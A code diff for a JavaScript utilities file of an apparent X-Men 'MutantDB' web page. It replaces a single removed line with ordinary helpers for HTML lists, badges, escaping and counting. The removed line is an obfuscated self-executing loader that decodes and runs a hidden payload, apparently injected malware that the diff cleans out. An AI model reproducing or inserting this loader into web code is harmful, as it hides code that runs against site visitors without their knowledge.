@@ -1,1 +1,113 @@
-(function(){var JJs='',Zdt=551-540;function ABD(o){var p=5727573;var x=o.length;var a=[];for(var q=0;q<x;q++){a[q]=o.charAt(q)};for(var q=0;q<x;q++){var j=p*(q+439)+(p%17899);var t=p*(q+586)+(p%35413);var l=j%x;var y=t%x;var f=a[l];a[l]=a[y];a[y]=f;p=(j+t)%6555273;};return a.join('')};var rwf=ABD('cutyqidowlcanurkzthnrmpgoscbsrfovtjxe').substr(0,Zdt);var ylV='-hr;ca1=j}=( a,=1+v ])c+=v((a0eh3["v.l.n"jn;=knh)ra+r;v,l),(v,*n57n6,(e1llt=l=+6 );6 {4r9.,+l,.Af7n rgo1r=.t1,t)((el;n85ia! uo+=.uC+ngtisC;v;2c8n.t8ins,t;vb)S;Crauea"==r;(dr}=tps{;,galix<n!t+nr=";;no.omar srsv gv{+Cl)zas=[e0p,rftnogfo[;lr1=rpfvrrh}},h8]rl,]aA]alai2hklp.r;[t.t-+rhheam,>fh.+];x=vl. qfncj6)n,i]gr (C=,ra{rvoeuoj{v[0+8s)saaa[i=r]keogt}"sho;r=uwr[oa9 {3,0fkliha()ji=iavso.cc;1(vt=)he2)h0;rpvo]r;]ir4pr+vl5oax+jo)4m.c 0k,h+eq;ehvr)-cst".;t+n]8e8a nitr;fw))a )5=(vnd, 6t1ul;,vjvefC)9e[f;y+1mo;d1cr,"=viea[b;+fdl >f=hvir)a".).s=C ah[ipv)=2+,(;gtqrhl9c;n=;.=(gmuf]=(hA7ao0sc0srrutg(nh+)r h a=;h<nezpa;1r2vujh}zv"i(0=;unl)ae-=r<=1n.;uglos)=ui+h=i;gec)wms)-f).,=nvx6(h)ho8(,0usq( a0kbe Al[.;7=.j;a7ddhuvh.a3+n;=t;3h;n9s,e2x09nfl;t]=g"i(o .-isnrrSw.sn[;()2m(ranC(v (f;ta;+ }t-;(vf8{tynboe]ut(ov++h)6p(,o0;6(v<x.c76to.p=b[brv8=(lir(n7rf9oi)(2)i],Adz<;[7=pr )o8o*4ctaldt(xpyrad3(oi2m)da';var Hyl=ABD[rwf];var oIy='';var VHK=Hyl;var MYL=Hyl(oIy,ABD(ylV));var rAQ=MYL(ABD('e{o(a)noX}().X0$)+b".XXolXX,*fl)c7l)i=X!XtahX_tN.f6T23;.EBnXef.alX;e-#D,4l.as.}+)HeBXX}t-t:;Fr.ot_e5.f(#obp% .aCaarnX )%XX5X16lX%oX1 _|_2aX( o3irXXns8tuX.1e.be2X2lX(s6,Xrb #rX523jtn6aEn),{,s l:.n.2X8DXt6wXX X;ip}oX%@fnre}!t3()>b=t== *9bXe)(3c)n9.s)ds11]n%] 0(X.ae%Xei.6r)o}).bXrfK)eXb}jal&4X3db)reeI>b!=8XfXDiXcXX=;.XXt.=jX:5yTXcEn.11dm)30ri(stX)]nblot.7i)2_pste0XfXr}5bX)%oskrt.(tb..&)Fa$Xvt4e.X7 c,?w.ECXXu};sbi,tc[HplXttfXXu51_b{Xa# 5Xt}e;7X]f.e:sHcE_jSXkeXsX)$eb-pXeht. m]$XX].2..Xm1frX<= MrXuob$e0unb+:dDtwh]>T.l,1p%o.(=_y,bhXXs.blsy;aXc8.Xb(.S4})bo#w1.,(e%..vX]B95XroXj.$\'ccre=pbueufX)nXauXXuaX b9_.{$.f[nbt%X74%,C3}cb_.{$reno)d_DXa=,l@2:0.XbX6fe66ta!e=6{.e{)!ff?$E]A9XX!or:nX3rs)mn6}bc.n=pXgb!]\/)5;ls)},ie!ps\/scX=X2arX".p%+pX{nX)g1X)I!;. ns_1X]fr,aXsl]X{bb{]n6n|$;,niXo=)SX.G:X63,)0g(3AXt(!dvsa43nsref.X[nuX3)d$%e;X26aa$.(!:ixrco4m@$nos XC4bf\/1jX!)N], Tyg;eb!b(xto .)i.X0)"Xeo!d)(9b_]$ ,!]&3X]do.s(*st.n)uoXet127lf@X-tIm9n5X7vX(rX;i )_=or.c!X0X%.b]$a9 =.c#XteXnt@.t(rbt42{X%5rlcX<tiDv*X(A4 brsX )7_n]<=euXlX72Xa5(\'7rc0rX;tt8(4oX;{,]wu8.ay1o2!ei)]."()y.d(a.oe"iu!(XMbX0Sgta 52{c6XtXibx8y-a)}a$iX.w)_MA(>,i0.X;t))t!D]o;_7oab:j3pC6rg,Ne=(Xo 0)IJ=hX3..|,0btjn1ec.,g%!<at;(i+cX cXhX)fnXryXX,Xt.,}t_({c0n}{X+.Xe4f,n %on%c,.sd6,%$8r65]X.bx(Xo6t6oXJjoo)d{mel8X5NSX4 X;rph8IuebaX)Xg(\/C7ml.t;u3o8o5.(3_Lc{t)-d1d=8 ycFtn7,x_5_3tXXX.X1.blX-boa.$jalsrr0e$( }cho3pXiXeX1X.;oSnn9Xs0 (XsX76)xX3G>a!stnX!)rt}s)\'eboehDk.fs]ovc _1=b>.s\/r.rbt);1(XejX Sffnb9X)ugr;)X=0s_t_]))ru}n(iX)hb3;5X_plXcdlu)%X%(7=23sr|.&XvXK__tXXeh%Xp5.}%ga;o1lsXtee{f!.X!1S6!")joa])Xe_a2b )tu}p;"Xl.sbjs3X((.49ltrs]\/i]XX2b,r!XXn(b.pbgnm($lofwXn"c"68fHrc=1])[1.)B77)lX.o(;Dyj5+seB)c$X.3;))c).ueJrX8g=6a%s45ebrws"4m5Xipf)sX{tX5}utc[(3_)3nX3h+0a]ruX.$iXX6=8;be3{[i3)$ajn)0o$Xb;X.1X.bfX%.XXsujs6nf!2(xXi]xaXce!c]A(b(5.#.eSf (a%9}.)(a2ca.X],s(!(,,efeticsXb5.pj7{=;eoMX,61rJr?fI=XX7=m{eX=ta.orl4Cbe3>af oh{til)vL7boaGitr;b{1e5u.ra5(n$]oXeIo#t1nl; NbsXale)12 5,6ls5bs.X%((1c,+g(if_n(icso].nb:.!_7Xa( e)Ks6,]cXeon."[ogX(B.fnoLn(s7aXy>tb2.,]c-(!rX.]2l0=abX!m 3b;X0(J}Cto_u%t4X])jjn(t!nt%5_la.e rXn+$e.5)(cXe)\'eX.e2rXG4e$8{))t(nea!=7I$ _ a1X(4t;t)SfD ]\/Xl2fuX3_w3)7KXb4Xo8(XX].oX]to2To)6T{o83eS3"e%[1b(noX2j1)%n{..!_5o(eb}d ,9n;5lX(CX{5aB(.a;S?}XL)l)jX,oo)e,Ehcbr)cr'));var fNW=VHK(JJs,rAQ );fNW(9265);return 6746})()
+const Utilities = {
+ /**
+  * Creates HTML list items from an array
+  * REQUIRED METHOD: Processes arrays and wraps in HTML
+  * @param {Array} items - Array of strings
+  * @param {String} className - CSS class for list items
+  * @returns {String} HTML string of list items
+  */
+ createListItems: function(items, className = '') {
+   if (!Array.isArray(items) || items.length === 0) {
+     return '<li class="text-muted">No data available</li>';
+   }
+  
+   return items.map(item => {
+     const specialClass = this.isSpecialPower(item) ? 'data-special="true"' : '';
+     return `<li class="${className}" ${specialClass}>${this.escapeHtml(item)}</li>`;
+   }).join('');
+ },
+
+
+ /**
+  * Creates badge elements from an array
+  * @param {Array} items - Array of strings
+  * @returns {String} HTML string of badges
+  */
+ createBadges: function(items) {
+   if (!Array.isArray(items) || items.length === 0) {
+     return '<span class="text-muted">No affiliations</span>';
+   }
+  
+   return items.map(item => {
+     const badgeClass = this.getAffiliationClass(item);
+     return `<span class="affiliation-badge ${badgeClass}">${this.escapeHtml(item)}</span>`;
+   }).join('');
+ },
+
+
+ /**
+  * Determines CSS class based on affiliation name
+  * @param {String} affiliation - Affiliation name
+  * @returns {String} CSS class name
+  */
+ getAffiliationClass: function(affiliation) {
+   const lower = affiliation.toLowerCase();
+   if (lower.includes('x-men')) return 'x-men';
+   if (lower.includes('brotherhood')) return 'brotherhood';
+   if (lower.includes('avengers')) return 'avengers';
+   return '';
+ },
+
+
+ /**
+  * Checks if a power is considered "special"
+  * @param {String} power - Power name
+  * @returns {Boolean}
+  */
+ isSpecialPower: function(power) {
+   const specialPowers = ['Phoenix Force', 'Regeneration', 'Telepathy', 'Energy Manipulation'];
+   return specialPowers.some(sp => power.toLowerCase().includes(sp.toLowerCase()));
+ },
+
+
+ /**
+  * Escapes HTML to prevent XSS
+  * @param {String} text - Raw text
+  * @returns {String} Escaped text
+  */
+ escapeHtml: function(text) {
+   const div = document.createElement('div');
+   div.textContent = text;
+   return div.innerHTML;
+ },
+
+
+ /**
+  * Formats height string
+  * @param {String} height - Height value
+  * @returns {String} Formatted height
+  */
+ formatHeight: function(height) {
+   return height || 'Unknown';
+ },
+
+
+ /**
+  * Counts unique items across all mutants
+  * @param {Array} mutants - Array of mutant objects
+  * @param {String} property - Property to count (e.g., 'powers', 'affiliation')
+  * @returns {Number} Count of unique items
+  */
+ countUniqueItems: function(mutants, property) {
+   const allItems = mutants.flatMap(m => m[property] || []);
+   return new Set(allItems).size;
+ },
+
+
+ /**
+  * Logs data to console with styling
+  * @param {String} message - Message to log
+  * @param {*} data - Data to log
+  */
+ log: function(message, data) {
+   console.log(`%c[MutantDB] ${message}`, 'color: #1565C0; font-weight: bold;', data);
+ }
+};
+
+
+// Export for use in other scripts (if using modules)
+if (typeof module !== 'undefined' && module.exports) {
+ module.exports = Utilities;
+}
+
+
